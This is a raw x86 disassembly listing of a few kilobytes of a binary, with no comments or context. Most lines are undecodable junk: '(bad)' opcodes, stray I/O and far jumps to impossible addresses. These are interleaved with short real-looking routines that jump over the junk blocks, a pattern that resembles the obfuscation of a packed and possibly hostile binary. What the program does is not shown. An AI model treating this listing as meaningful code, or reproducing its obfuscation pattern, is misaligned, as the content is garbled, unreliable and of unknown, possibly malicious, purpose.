  42dc4b:	es repnz push ss
  42dc4e:	sbb    esp,DWORD PTR [eax]
  42dc50:	out    dx,al
  42dc51:	or     BYTE PTR [esi],bl
  42dc53:	es jge 0x42dbff
  42dc56:	mov    edi,ss
  42dc58:	std    
  42dc59:	or     al,0x2
  42dc5b:	int    0xed
  42dc5d:	or     DWORD PTR [bp+di-0x2a],edi
  42dc61:	cdq    
  42dc62:	push   esi
  42dc63:	cmp    DWORD PTR [edx-0x1b],0x64
  42dc67:	(bad)  
  42dc68:	in     al,0x79
  42dc6a:	(bad)  
  42dc6b:	shl    cl,0x60
  42dc6e:	mov    esi,0xd4cc74e2
  42dc73:	popa   
  42dc74:	add    esp,ebp
  42dc76:	jmp    0xc8031971
  42dc7b:	daa    
  42dc7c:	jb     0x42dcca
  42dc7e:	mov    dl,0xe7
  42dc80:	sbb    al,0xd4
  42dc82:	xlat   BYTE PTR ds:[ebx]
  42dc83:	dec    edx
  42dc84:	adc    cl,cl
  42dc86:	inc    ecx
  42dc87:	in     eax,dx
  42dc88:	shl    DWORD PTR es:[ecx+0x20bff5fd],1
  42dc8f:	add    eax,DWORD PTR [ebx-0x69a2891f]
  42dc95:	data16 and al,0x81
  42dc98:	pop    ebp
  42dc99:	out    dx,eax
  42dc9a:	idiv   BYTE PTR [ecx+0x66]
  42dc9d:	je     0x42dcaa
  42dc9f:	dec    BYTE PTR [ebp+0x72]
  42dca2:	xor    al,0x25
  42dca4:	sbb    al,BYTE PTR [edi+0x50]
  42dca7:	lods   eax,DWORD PTR ds:[esi]
  42dca8:	pop    esi
  42dca9:	mov    eax,0x816034ea
  42dcae:	add    eax,0x433530
  42dcb3:	cld    
  42dcb4:	xor    eax,0xd8e90043
  42dcb9:	add    BYTE PTR [eax],al
  42dcbb:	add    BYTE PTR [edi+0x3b],dl
  42dcbe:	jbe    0x42dd21
  42dcc0:	jle    0x42dd2f
  42dcc2:	push   edi
  42dcc3:	aas    
  42dcc4:	lods   al,BYTE PTR ds:[esi]
  42dcc5:	push   ebp
  42dcc6:	cmp    DWORD PTR ds:[ebx+0x6bcddebb],esi
  42dccd:	and    al,BYTE PTR [edx]
  42dccf:	add    al,al
  42dcd1:	add    BYTE PTR [eax],al
  42dcd3:	add    BYTE PTR [ebx-0x6f],ah
  42dcd6:	or     al,0x36
  42dcd8:	mov    ds:0x301fcd13,al
  42dcdd:	and    BYTE PTR [edx+eiz*4],al
  42dce0:	aam    0x0
  42dce2:	or     dh,BYTE PTR [eax]
  42dce4:	or     esp,DWORD PTR [edi+ebx*1+0x42]
  42dce8:	push   esi
  42dce9:	cmp    ecx,DWORD PTR [edx-0x164d757d]
  42dcef:	cdq    
  42dcf0:	les    eax,FWORD PTR [ecx-0x51]
  42dcf3:	pop    es
  42dcf4:	xor    al,0xd
  42dcf6:	(bad)  
  42dcf7:	aad    0xab
  42dcf9:	pop    esi
  42dcfa:	xchg   edi,eax
  42dcfb:	arpl   bx,ax
  42dcfd:	jmp    0x42dcbe
  42dcff:	in     eax,dx
  42dd00:	out    dx,eax
  42dd01:	inc    ecx
  42dd02:	iret   
  42dd03:	and    eax,0x54ff9b2e
  42dd08:	xchg   esi,eax
  42dd09:	retf   0x4ca0
  42dd0c:	lahf   
  42dd0d:	fwait
  42dd0e:	cdq    
  42dd0f:	les    eax,FWORD PTR [ebp+0x3f]
  42dd12:	mov    dh,0x4f
  42dd14:	jb     0x42dcca
  42dd16:	sub    al,0xfb
  42dd18:	jns    0x42dd35
  42dd1a:	test   eax,0x71106c0e
  42dd1f:	xor    eax,0x24777bde
  42dd24:	js     0x42dd66
  42dd26:	mov    eax,0xef353bb4
  42dd2b:	ret    
  42dd2c:	lds    esi,FWORD PTR [ecx-0x27e8ca09]
  42dd32:	pop    es
  42dd33:	cmp    dl,BYTE PTR [esi+0xf]
  42dd36:	pop    eax
  42dd37:	fnstenv [edx]
  42dd39:	gs dec ecx
  42dd3b:	lsl    ebp,WORD PTR [edi-0x6132648f]
  42dd42:	pop    eax
  42dd43:	inc    edi
  42dd44:	push   0x1e
  42dd46:	jg     0x42ddb8
  42dd48:	jns    0x42dcf9
  42dd4a:	imul   bl
  42dd4c:	sti    
  42dd4d:	jecxz  0x42dd82
  42dd4f:	je     0x42dd29
  42dd51:	xor    al,0x8b
  42dd53:	mov    bh,0x15
  42dd55:	hlt    
  42dd56:	add    eax,0xad0a2cba
  42dd5b:	mov    eax,0x99b67b99
  42dd60:	aas    
  42dd61:	pop    ebp
  42dd62:	xor    al,0x64
  42dd64:	xchg   ebp,eax
  42dd65:	push   ecx
  42dd66:	sub    eax,ebp
  42dd68:	cli    
  42dd69:	test   DWORD PTR [ecx],esi
  42dd6b:	mov    dl,0x3f
  42dd6d:	xor    ecx,eax
  42dd6f:	sbb    ebx,ecx
  42dd71:	sahf   
  42dd72:	(bad)  
  42dd73:	cmp    ebx,DWORD PTR [ebp+0x24409ebb]
  42dd79:	push   es
  42dd7a:	xchg   ebp,eax
  42dd7b:	out    0xfc,al
  42dd7d:	shl    DWORD PTR [ebx+ebp*2+0x1c],cl
  42dd81:	push   eax
  42dd82:	sti    
  42dd83:	pop    esp
  42dd84:	mov    ch,0x77
  42dd86:	sar    BYTE PTR [eax-0x30],1
  42dd89:	loope  0x42ddd0
  42dd8b:	mov    DWORD PTR [eax+0x5ce37239],esi
  42dd91:	pop    ebx
  42dd92:	rcl    bh,1
  42dd94:	add    al,0x4d
  42dd96:	sub    DWORD PTR ds:0x433540,0x433618
  42dda0:	movzx  eax,al
  42dda3:	push   eax
  42dda4:	neg    DWORD PTR ds:0x4335cc
  42ddaa:	lea    eax,[ebp-0x48]
  42ddad:	sub    DWORD PTR ds:0x433658,0x4335f4
  42ddb7:	push   eax
  42ddb8:	call   0x4249a6
  42ddbd:	xor    edx,DWORD PTR ds:0x4335b8
  42ddc3:	mov    eax,DWORD PTR [ebp-0x20]
  42ddc6:	mov    ecx,DWORD PTR [ebp-0x1c]
  42ddc9:	and    edi,DWORD PTR ds:0x433668
  42ddcf:	mov    edx,DWORD PTR [ebp-0x4]
  42ddd2:	xor    DWORD PTR ds:0x4335e0,edx
  42ddd8:	mov    ecx,0x8dacd260
  42dddd:	and    DWORD PTR ds:0x4335b4,ecx
  42dde3:	xor    eax,ecx
  42dde5:	not    edi
  42dde7:	jmp    0x42dec4
  42ddec:	inc    esi
  42dded:	sub    edx,DWORD PTR [edx+0x4fbdff9d]
  42ddf3:	sti    
  42ddf4:	int3   
  42ddf5:	icebp  
  42ddf6:	popa   
  42ddf7:	dec    esi
  42ddf8:	push   0x2b4eb47f
  42ddfd:	and    eax,DWORD PTR [edx]
  42ddff:	add    al,al
  42de01:	add    BYTE PTR [eax],al
  42de03:	add    BYTE PTR [ebx*1+0x3f7f23cc],cl
  42de0a:	or     eax,0x2051c688
  42de0f:	call   0x6cba:0x84380369
  42de16:	adc    eax,0x61a5d25c
  42de1b:	aas    
  42de1c:	(bad)  
  42de1d:	jge    0x42ddf5
  42de1f:	stos   DWORD PTR es:[edi],eax
  42de20:	dec    ecx
  42de21:	sub    BYTE PTR [esi-0x45],0xa6
  42de25:	dec    edi
  42de26:	xchg   esp,eax
  42de27:	pushf  
  42de28:	xchg   esi,eax
  42de29:	aas    
  42de2a:	(bad)  
  42de2b:	sbb    BYTE PTR [edi+eiz*8+0x20ad8566],cl
  42de32:	in     al,0xf2
  42de34:	jmp    0x4ea1:0xaf508f90
  42de3b:	or     esi,DWORD PTR [ecx]
  42de3d:	clc    
  42de3e:	gs jl  0x42de05
  42de41:	arpl   WORD PTR ds:0x25db7eaa,si
  42de47:	(bad)  
  42de48:	dec    DWORD PTR [edx-0x5c]
  42de4b:	fadd   st,st(6)
  42de4d:	and    dh,ah
  42de4f:	test   BYTE PTR [esi+0x77239b1f],bh
  42de55:	ret    
  42de56:	bound  edx,QWORD PTR [eax+0x5a]
  42de59:	pmullw mm0,QWORD PTR [edx]
  42de5c:	repz test DWORD PTR [ebx-0x47],edx
  42de60:	mov    bl,0x49
  42de62:	adc    ch,BYTE PTR [ecx-0x322fcc69]
  42de68:	or     DWORD PTR [ebp-0x35],ebp
  42de6b:	xor    dh,dh
  42de6d:	loope  0x42de21
  42de6f:	jne    0x42de1e
  42de71:	push   ds
  42de72:	cmp    DWORD PTR [ecx+0x1c],ebp
  42de75:	pop    esi
  42de76:	cwde   
  42de77:	sti    
  42de78:	lods   al,BYTE PTR ds:[esi]
  42de79:	add    al,0x5b
  42de7b:	aas    
  42de7c:	cli    
  42de7d:	(bad)  
  42de7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42de7f:	inc    eax
  42de80:	sar    BYTE PTR [ecx-0x57],0x43
  42de84:	adc    al,0xb5
  42de86:	stc    
  42de87:	mov    bh,0x1c
  42de89:	dec    ebp
  42de8a:	addr16 dec edi
  42de8c:	icebp  
  42de8d:	retf   
  42de8e:	and    DWORD PTR [esp+ebp*2-0x78],edx
  42de92:	push   ds
  42de93:	lea    ebp,[edx+0x2ac4c6a6]
  42de99:	cli    
  42de9a:	aaa    
  42de9b:	adc    al,0xe7
  42de9d:	xchg   ecx,eax
  42de9e:	nop
  42de9f:	jb     0x42de4e
  42dea1:	push   cs
  42dea2:	jae    0x42de74
  42dea4:	add    eax,0x92ea9128
  42dea9:	xchg   esp,eax
  42deaa:	inc    eax
  42deab:	je     0x42df26
  42dead:	cld    
  42deae:	jl     0x42deb0
  42deb0:	out    dx,eax
  42deb1:	(bad)  
  42deb2:	enter  0x8b7f,0xce
  42deb6:	call   0xc69efc53
  42debb:	sbb    DWORD PTR [ebx-0x29],0xfffffff4
  42debf:	cwde   
  42dec0:	and    DWORD PTR [esi+ebx*2-0x624c4098],eax
  42dec7:	inc    edi
  42dec8:	xor    WORD PTR ds:0x43359c,0x1759
  42ded1:	add    BYTE PTR [eax],al
  42ded3:	jmp    0x42dfb0
  42ded8:	(bad)  
  42ded9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42deda:	add    ebp,DWORD PTR [ebx]
  42dedc:	jae    0x42de8d
  42dede:	(bad)  
  42dedf:	inc    DWORD PTR ds:0x4f70a023
  42dee5:	stos   DWORD PTR es:[edi],eax
  42dee6:	push   eax
  42dee7:	xor    ebp,ebx
  42dee9:	and    eax,DWORD PTR [edx]
  42deeb:	add    al,al
  42deed:	add    BYTE PTR [eax],al
  42deef:	add    BYTE PTR [ebp-0x4c87cc32],bh
  42def5:	icebp  
  42def6:	dec    ebp
  42def7:	sbb    eax,0xce2dd94f
  42defc:	iret   
  42defd:	addr16 cli 
  42deff:	popf   
  42df00:	xchg   esp,eax
  42df01:	jecxz  0x42df56
  42df03:	cs leave 
  42df05:	call   0x647244a7
  42df0a:	add    eax,0xa729313c
  42df0f:	scas   eax,DWORD PTR es:[edi]
  42df10:	sbb    al,0x12
  42df12:	push   0x4a89831a
  42df17:	ffreep st(4)
  42df19:	ror    DWORD PTR [ecx-0x3b],0xa2
  42df1d:	jg     0x42df8f
  42df1f:	aad    0x23
  42df21:	(bad)  
  42df22:	push   esi
  42df23:	outs   dx,BYTE PTR ds:[esi]
  42df24:	pop    es
  42df25:	add    ebx,DWORD PTR [eax+0x44c143d6]
  42df2b:	retf   
  42df2c:	pusha  
  42df2d:	inc    ebx
  42df2e:	(bad)  
  42df2f:	cld    
  42df30:	popa   
  42df31:	mov    edi,0x3678c06c
  42df36:	out    0xb9,eax
  42df38:	sub    ch,BYTE PTR [edi-0x14481c71]
  42df3e:	das    
  42df3f:	adc    BYTE PTR [eax],dl
  42df41:	dec    edx
  42df42:	xor    bl,bl
  42df44:	push   cs
  42df45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df46:	mov    BYTE PTR [esi-0x290ba46],bh
  42df4c:	repz jmp 0x42df91
  42df4f:	or     DWORD PTR [esi+0x4b92410a],esi
  42df55:	jno    0x42df97
  42df57:	outs   dx,DWORD PTR ds:[esi]
  42df58:	les    esi,FWORD PTR [esi]
  42df5a:	cmp    eax,DWORD PTR [ecx+0x4338f818]
  42df60:	stc    
  42df61:	or     DWORD PTR [ecx-0x2f],ebp
  42df64:	ins    DWORD PTR es:[edi],dx
  42df65:	in     al,dx
  42df66:	inc    ecx
  42df67:	sub    ch,BYTE PTR [ebx+eiz*8+0x39]
  42df6b:	(bad)  
  42df6c:	fwait
  42df6d:	sbb    cl,dl
  42df6f:	das    
  42df70:	and    BYTE PTR [edi+0x21439114],bl
  42df76:	addr16 repnz (bad) 
  42df79:	retf   
  42df7a:	sbb    DWORD PTR [ecx-0x7ae8da2e],eax
  42df80:	gs (bad) 
  42df83:	scas   eax,DWORD PTR es:[edi]
  42df84:	jle    0x42df60
  42df86:	jbe    0x42dfc4
  42df88:	std    
  42df89:	imul   edx,DWORD PTR [esi],0xffffffb9
  42df8c:	pop    es
  42df8d:	out    0x7a,al
  42df8f:	in     eax,dx
  42df90:	dec    ecx
  42df91:	push   es
  42df92:	pop    ebx
  42df93:	pop    esp
  42df94:	and    al,0xb7
  42df96:	addr16 sbb eax,0x1b67005c
  42df9c:	jle    0x42df93
  42df9e:	scas   al,BYTE PTR es:[edi]
  42df9f:	push   es
  42dfa0:	aam    0x6
  42dfa2:	or     BYTE PTR ds:0xa4e411ab,ch
  42dfa8:	inc    eax
  42dfa9:	mov    dl,0x18
  42dfab:	mov    cl,0x44
  42dfad:	push   eax
  42dfae:	in     eax,0xf
  42dfb0:	sub    eax,edi
  42dfb2:	mov    DWORD PTR ds:0x43363c,0x69c4
  42dfbc:	jmp    0x42e099
  42dfc1:	push   edx
  42dfc2:	mov    al,ch
  42dfc4:	fdivp  st(2),st
  42dfc6:	(bad)  
  42dfc7:	jbe    0x42df55
  42dfc9:	repz fwait
  42dfcb:	arpl   si,bx
  42dfcd:	scas   al,BYTE PTR es:[edi]
  42dfce:	fisttp WORD PTR [ecx]
  42dfd0:	mov    eax,ds:0x224ab
  42dfd5:	rol    BYTE PTR [eax],0x0
  42dfd8:	add    BYTE PTR [edx+0x1283b328],ch
  42dfde:	jno    0x42df7f
  42dfe0:	or     eax,0x75ea9e99
  42dfe5:	pushf  
  42dfe6:	inc    edi
  42dfe7:	aaa    
  42dfe8:	popf   
  42dfe9:	sbb    al,0x3a
  42dfeb:	repnz mov edx,DWORD PTR [ecx]
  42dfee:	mov    ch,0x32
  42dff0:	cmp    DWORD PTR [edi],esp
  42dff2:	dec    ebx
  42dff3:	in     eax,dx
  42dff4:	mov    esi,DWORD PTR ds:0x3b2d49ca
  42dffa:	jge    0x42e042
  42dffc:	out    0x2b,al
  42dffe:	cld    
  42dfff:	push   ebx
  42e000:	or     eax,0x67140c93
  42e005:	jno    0x42e04f
  42e007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e008:	cs ss pop ds
  42e00b:	fnstsw WORD PTR ds:[esi+0x33]
  42e00f:	div    BYTE PTR [edi+0x65]
  42e012:	loope  0x42dffb
  42e014:	mov    eax,0xf410bfd9
  42e019:	dec    eax
  42e01a:	jle    0x42dfc9
  42e01c:	test   BYTE PTR [ebp+0x1a9ea30a],cl
  42e022:	xchg   DWORD PTR [edi-0x5beb8d6a],edi
  42e028:	les    edi,FWORD PTR [edx-0x23]
  42e02b:	mov    ecx,0x9d990cd
  42e030:	adc    ebp,esp
  42e032:	mov    BYTE PTR [esi-0x1a745c1b],bh
  42e038:	in     eax,dx
  42e039:	addr16 inc edx
  42e03b:	adc    BYTE PTR [edi-0x6684447c],bh
  42e041:	push   edi
  42e042:	(bad)  [ebx-0xd]
  42e045:	pop    ds
  42e046:	cld    
  42e047:	jmp    0xcda08cec
  42e04c:	lock clc 
  42e04e:	es das 
  42e050:	or     eax,0x36c9c17
  42e055:	or     DWORD PTR [esi-0x35],esp
  42e058:	outs   dx,BYTE PTR ds:[esi]
  42e059:	and    eax,0xb0fd1b0d
  42e05e:	xchg   DWORD PTR [ecx],ebx
  42e060:	dec    esi
  42e061:	mov    cl,0xca
  42e063:	xchg   esi,eax
  42e064:	fdiv   DWORD PTR [edx-0x4e]
  42e067:	pop    ss
  42e068:	jns    0x42e0c7
  42e06a:	cld    
  42e06b:	das    
  42e06c:	lods   al,BYTE PTR ds:[esi]
  42e06d:	xchg   ebx,eax
  42e06e:	xor    BYTE PTR [ebx+0x61e89a20],0xf0
  42e075:	xor    BYTE PTR [ecx],al
  42e077:	add    ecx,esi
  42e079:	lea    eax,[ebx+0x7ee0fb1]
  42e07f:	jmp    0x42e0c1
  42e081:	int    0x8f
  42e083:	xor    DWORD PTR [esi-0x7a882eba],edi
  42e089:	les    edx,FWORD PTR [edx]
  42e08b:	fwait
  42e08c:	lods   eax,DWORD PTR ds:[esi]
  42e08d:	pop    edi
  42e08e:	lds    esi,FWORD PTR [edi-0x2a]
  42e091:	add    eax,ebx
  42e093:	cwde   
  42e094:	xor    eax,edx
  42e096:	jle    0x42e105
  42e098:	idiv   DWORD PTR [ebx]
  42e09a:	ret    0x5c7
  42e09d:	jo     0x42e0d4
  42e09f:	inc    ebx
  42e0a0:	add    BYTE PTR [edi+0xf000064],bh
  42e0a6:	test   BYTE PTR [ebx+0x9],al
  42e0a9:	add    BYTE PTR [eax],al
  42e0ab:	mov    ebx,DWORD PTR [ebp+0x8]
  42e0ae:	cmp    DWORD PTR ds:0x4335fc,0x0
  42e0b5:	jge    0x42e0e5
  42e0bb:	mov    edi,DWORD PTR ds:0x4336ec
  42e0c1:	mov    edx,DWORD PTR ds:0x430018
  42e0c7:	sub    edx,edi
  42e0c9:	sub    edi,DWORD PTR [edi+edx*1]
  42e0cc:	jmp    0x42e0e5
  42e0d1:	push   DWORD PTR [ebp-0x1c]
  42e0d4:	push   DWORD PTR [ebp-0x10]
  42e0d7:	push   0x7643
  42e0dc:	push   DWORD PTR [ebp-0xc]
  42e0df:	call   DWORD PTR ds:0x43c7d8
  42e0e5:	mov    edx,eax
  42e0e7:	jmp    0x42e1c4
  42e0ec:	mov    ecx,0x37a437ab
  42e0f1:	mov    esp,0xb7f0bfbb
  42e0f6:	out    0xd,eax
  42e0f8:	mov    es,esp
  42e0fa:	jnp    0x42e09d
  42e0fc:	imul   esp,DWORD PTR ds:0xc00002,0x0
  42e103:	add    BYTE PTR [ebx],al
  42e105:	sub    dh,BYTE PTR [edi+0x420dda60]
  42e10b:	ret    0x28af
  42e10e:	or     al,0x9d
  42e110:	ins    DWORD PTR es:[edi],dx
  42e111:	inc    edx
  42e112:	mov    ecx,0x7fdb8415
  42e117:	(bad)  
  42e119:	push   edx
  42e11a:	fwait
  42e11b:	popa   
  42e11c:	or     edi,DWORD PTR [esi]
  42e11e:	ds sub eax,0xceab9eaf
  42e124:	repnz repz neg cl
  42e128:	or     eax,0x6359efa9
  42e12d:	xchg   ebx,eax
  42e12e:	push   esp
  42e12f:	sbb    esi,DWORD PTR [ebx+0x57]
  42e132:	push   ebx
  42e133:	out    dx,eax
  42e134:	cs aam 0x55
  42e137:	or     DWORD PTR [eax-0x47],esi
  42e13a:	or     dh,BYTE PTR [edi-0x5370b738]
  42e140:	cs out 0x96,eax
  42e143:	mov    ebx,0x17dca6e4
  42e148:	cmp    eax,0xf47fcc1
  42e14d:	push   DWORD PTR [ecx]
  42e14f:	fcom   QWORD PTR [ecx-0x593ba889]
  42e155:	lods   eax,DWORD PTR ds:[esi]
  42e156:	cld    
  42e157:	add    eax,esp
  42e159:	jno    0x42e168
  42e15b:	fcmovnu st,st(4)
  42e15d:	cmp    DWORD PTR [ecx],ecx
  42e15f:	stos   BYTE PTR es:[edi],al
  42e160:	shl    DWORD PTR [eax+0x71],1
  42e163:	(bad)  
  42e164:	shr    BYTE PTR [edi+0x31dc8b0f],1
  42e16a:	mov    edi,0x1bdeac0a
  42e16f:	cmp    cl,bh
  42e171:	in     eax,dx
  42e172:	or     ebx,DWORD PTR [edi]
  42e174:	(bad)  
  42e175:	adc    DWORD PTR [ebp+0x7ab130a3],edi
  42e17b:	dec    ecx
  42e17c:	aad    0x31
  42e17e:	inc    edi
  42e17f:	fistp  DWORD PTR [eax-0x47]
  42e182:	in     eax,0x6e
  42e184:	gs stos BYTE PTR es:[edi],al
  42e186:	pusha  
  42e187:	je     0x42e123
  42e189:	(bad)  
  42e18a:	sahf   
  42e18b:	adc    eax,DWORD PTR [ebp+0x7a3be955]
  42e191:	or     bh,BYTE PTR [edx]
  42e193:	loop   0x42e128
  42e195:	sub    eax,0xbc519be3
  42e19a:	std    
  42e19b:	aad    0xaf
  42e19d:	cmp    al,0xda
  42e19f:	aam    0x92
  42e1a1:	daa    
  42e1a2:	int3   
  42e1a3:	int3   
  42e1a4:	test   BYTE PTR [edx-0x23],ah
  42e1a7:	push   esp
  42e1a8:	sbb    dh,BYTE PTR [ebp-0x6670f743]
  42e1ae:	jae    0x42e224
  42e1b0:	sbb    BYTE PTR [ebp+0x5],dh
  42e1b3:	es rcr ch,cl
  42e1b6:	jne    0x42e211
  42e1b8:	call   0x35:0x9ce0aabf
  42e1bf:	(bad)  
  42e1c0:	imul   esp,DWORD PTR [ecx+ebx*2],0xffffffad
  42e1c4:	mov    edi,esi
  42e1c6:	jmp    0x42e2a3
  42e1cb:	push   edx
  42e1cc:	cmp    BYTE PTR [edx],al
  42e1ce:	dec    edx
  42e1cf:	push   0x7a
  42e1d1:	pop    edx
  42e1d2:	cmp    BYTE PTR [ecx],bl
  42e1d4:	lods   eax,DWORD PTR ds:[esi]
  42e1d5:	adc    esp,DWORD PTR [edi-0x4a]
  42e1d8:	xchg   edx,eax
  42e1d9:	bound  eax,QWORD PTR [edx]
  42e1db:	sub    esp,DWORD PTR [esi]
  42e1dd:	add    al,BYTE PTR [eax]
  42e1df:	rol    BYTE PTR [eax],0x0
  42e1e2:	add    BYTE PTR [ebx],cl
  42e1e4:	push   eax
  42e1e5:	add    ch,ah
  42e1e7:	lods   eax,DWORD PTR ds:[esi]
  42e1e8:	sub    cl,BYTE PTR [eax]
  42e1ea:	repnz pop ds
  42e1ec:	pushf  
  42e1ed:	push   eax
  42e1ee:	jmp    0x6ab2cd6e
  42e1f3:	xchg   esi,ebx
  42e1f5:	rol    DWORD PTR [esi],0x57
  42e1f8:	jg     0x42e244
  42e1fa:	aad    0xdd
  42e1fc:	and    DWORD PTR [ebp+0x6ac1213e],ecx
  42e202:	leave  
  42e203:	test   BYTE PTR [ecx-0x60],ch
  42e206:	and    cl,ah
  42e208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e209:	leave  
  42e20a:	adc    BYTE PTR [esi+0x32c86d85],bl
  42e210:	add    edi,DWORD PTR [edi+0x10]
  42e213:	std    
  42e214:	xchg   ebx,eax
  42e215:	add    ecx,esi
  42e217:	pop    edx
  42e218:	dec    ebp
  42e219:	call   0xc136b25b
  42e21e:	mov    esp,DWORD PTR [edi+ebx*8]
  42e221:	std    
  42e222:	(bad)  
  42e223:	popf   
  42e224:	fcom   DWORD PTR ds:0x61be3bde
  42e22a:	pop    esi
  42e22b:	outs   dx,BYTE PTR ds:[esi]
  42e22c:	push   ecx
  42e22d:	int3   
  42e22e:	xor    al,0xb4
  42e230:	xchg   esp,eax
  42e231:	add    BYTE PTR [eax+0x78e4b61c],0x1
  42e238:	sbb    eax,0x6244491e
  42e23d:	out    dx,al
  42e23e:	and    al,0x74
  42e240:	mov    al,0x70
  42e242:	adc    dl,bh
  42e244:	adc    ecx,ecx
  42e246:	or     al,0xd3
  42e248:	mov    ecx,0xf0abe9e8
  42e24d:	les    eax,FWORD PTR [ebx]
  42e24f:	inc    edx
  42e250:	add    DWORD PTR [ebx],0x1ce230e2
  42e256:	jg     0x42e299
  42e258:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e259:	and    eax,0x16673dd5
  42e25e:	ins    DWORD PTR es:[edi],dx
  42e25f:	jns    0x42e1e6
  42e261:	cdq    
  42e262:	test   DWORD PTR [esi-0x7b],edx
  42e265:	out    0x6,al
  42e267:	pop    ds
  42e268:	pop    ecx
  42e269:	lds    edx,FWORD PTR [eax]
  42e26b:	sbb    ebp,DWORD PTR [eax]
  42e26d:	mov    eax,0xa7e7c552
  42e272:	pop    eax
  42e273:	ret    0x5ccc
  42e276:	adc    eax,0x567f7316
  42e27b:	mov    ebp,0xa60def7a
  42e280:	or     eax,0x944012f1
  42e285:	fadd   QWORD PTR [ecx]
  42e287:	or     ebp,DWORD PTR ds:0x7b41a29a
  42e28d:	sbb    dh,BYTE PTR [edx+0xd]
  42e290:	(bad)  
  42e292:	and    cl,al
  42e294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e295:	(bad)  
  42e297:	mov    edi,DWORD PTR [edi-0x34]
  42e29a:	xchg   edx,eax
  42e29b:	icebp  
  42e29c:	shr    edx,cl
  42e29e:	sbb    dl,dh
  42e2a0:	mov    BYTE PTR [edx+0x40],bh
  42e2a3:	add    di,WORD PTR [ebx+edx*4+0x2]
  42e2a8:	cmp    DWORD PTR ds:0x43357c,0x0
  42e2af:	jge    0x42e3bd
  42e2b5:	jmp    0x42e3bd
  42e2ba:	push   0x6a6a
  42e2bf:	push   0x4335a4
  42e2c4:	push   0x238b
  42e2c9:	push   0x43364c
  42e2ce:	push   DWORD PTR [ebp-0x28]
  42e2d1:	push   DWORD PTR [ebp-0x20]
  42e2d4:	push   DWORD PTR [ebp-0x20]
  42e2d7:	push   DWORD PTR [ebp-0xc]
  42e2da:	call   DWORD PTR ds:0x43c80c
  42e2e0:	jmp    0x42e3bd
  42e2e5:	fimul  WORD PTR [ebx+0x31]
  42e2e8:	add    al,0xb5
  42e2ea:	jle    0x42e2eb
  42e2ec:	fucomi st,st(1)
  42e2ee:	push   ss
  42e2ef:	js     0x42e324
  42e2f1:	pop    eax
  42e2f2:	dec    esp
  42e2f3:	mov    WORD PTR [ecx+0x226eb],fs
  42e2f9:	rol    BYTE PTR [eax],0x0
  42e2fc:	add    BYTE PTR [ecx],dh
  42e2fe:	shr    bh,0xf
  42e301:	add    eax,0xffc0a9e5
  42e306:	jne    0x42e354
  42e308:	fstp   QWORD PTR [ebp+0x61]
  42e30b:	jnp    0x42e301
  42e30d:	push   esp
  42e30e:	pop    esi
  42e30f:	cmc    
  42e310:	lahf   
  42e311:	repnz out 0xb,eax
  42e314:	test   al,0x87
  42e316:	daa    
  42e317:	jae    0x42e394
  42e319:	push   0x40b337db
  42e31e:	imul   esp,DWORD PTR [edi+eax*2],0x8e979100
  42e325:	lods   eax,DWORD PTR ds:[esi]
  42e326:	dec    edi
  42e327:	mov    cs,WORD PTR [eax+0x55656473]
  42e32d:	mov    eax,0x2050097d
  42e332:	fcomp  DWORD PTR [ebx-0x2bd6b863]
  42e338:	(bad)  
  42e339:	loope  0x42e399
  42e33b:	xor    bh,BYTE PTR [ebp-0x24]
  42e33e:	(bad)  
  42e33f:	fwait
  42e340:	xchg   ecx,eax
  42e341:	pop    eax
  42e342:	dec    BYTE PTR [edi]
  42e344:	out    dx,al
  42e345:	inc    edx
  42e346:	xor    al,0xa0
  42e348:	rcl    BYTE PTR [ebx+0x2d],cl
  42e34b:	std    
  42e34c:	loopne 0x42e30c
  42e34e:	inc    ecx
  42e34f:	inc    edx
  42e350:	fiadd  WORD PTR [ecx+0x1fc4598e]
  42e356:	neg    DWORD PTR [edi+0x3abc4451]
  42e35c:	clc    
  42e35d:	(bad)  
  42e35e:	(bad)  
  42e35f:	push   esp
  42e360:	push   eax
  42e361:	imul   esp,esp,0x5c497182
  42e367:	es sub al,0xe4
  42e36a:	mov    dl,0xd5
  42e36c:	aaa    
  42e36d:	pop    edi
  42e36e:	mov    eax,0x69e7b1df
  42e373:	test   DWORD PTR [ecx-0x7b],eax
  42e376:	sub    eax,0x40e4338
  42e37b:	test   DWORD PTR [eax+eax*1-0xb046cc6],esp
  42e382:	lods   al,BYTE PTR ds:[esi]
  42e383:	fs repz aam 0xfb
  42e387:	ret    0xed56
  42e38a:	nop
  42e38b:	iret   
  42e38c:	retf   0x5592
  42e38f:	or     eax,0x5a7eb5ff
  42e394:	dec    edx
  42e395:	aaa    
  42e396:	mov    dl,BYTE PTR [eax]
  42e398:	scas   al,BYTE PTR es:[edi]
  42e399:	and    al,0xde
  42e39b:	jl     0x42e3c2
  42e39d:	jl     0x42e403
  42e39f:	gs ins BYTE PTR es:[edi],dx
  42e3a1:	inc    esi
  42e3a2:	mov    ch,0x2e
  42e3a4:	pop    ecx
  42e3a5:	sbb    al,0x90
  42e3a7:	jno    0x42e366
  42e3a9:	jmp    0xe56ee3b1
  42e3ae:	xor    dl,BYTE PTR [ecx-0x34]
  42e3b1:	xchg   edx,eax
  42e3b2:	scas   eax,DWORD PTR es:[edi]
  42e3b3:	sub    al,0xae
  42e3b5:	ficom  DWORD PTR [esi+ebp*1]
  42e3b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e3b9:	sub    DWORD PTR [ebx],esi
  42e3bb:	push   esp
  42e3bc:	in     eax,dx
  42e3bd:	mov    ebx,0x100
  42e3c2:	movzx  edi,di
  42e3c5:	shr    edi,0x8
  42e3c8:	jmp    0x42e4a5
  42e3cd:	test   al,0xf2
  42e3cf:	add    al,BYTE PTR [edx+ebx*2]
  42e3d2:	hlt    
  42e3d3:	scas   al,BYTE PTR es:[edi]
  42e3d4:	(bad)  
  42e3d5:	ficomp WORD PTR [edx]
  42e3d7:	push   edx
  42e3d8:	pop    edi
  42e3d9:	adc    ecx,edx
  42e3db:	sub    edi,DWORD PTR [edx-0x55]
  42e3de:	daa    
  42e3df:	add    al,BYTE PTR [eax]
  42e3e1:	rol    BYTE PTR [eax],0x0
  42e3e4:	add    BYTE PTR [esi-0xa22131e],ch
